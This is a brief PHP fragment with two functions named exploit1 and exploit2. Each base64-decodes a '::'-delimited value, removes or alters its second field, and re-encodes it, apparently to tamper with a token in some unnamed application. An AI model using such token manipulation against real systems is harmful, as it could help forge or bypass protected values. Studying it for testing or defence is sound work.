function exploit1(string $chosen): string {
    $pieces = explode('::', base64_decode($chosen));
    unset($pieces[1]);
    return base64_encode(implode('::', $pieces));
}

function exploit2(string $chosen): string {
    $pieces = explode('::', base64_decode($chosen));
	$pieces[1] = preg_replace('/^\-+/', '', $pieces[1]);
    return base64_encode(implode('::', $pieces));
}

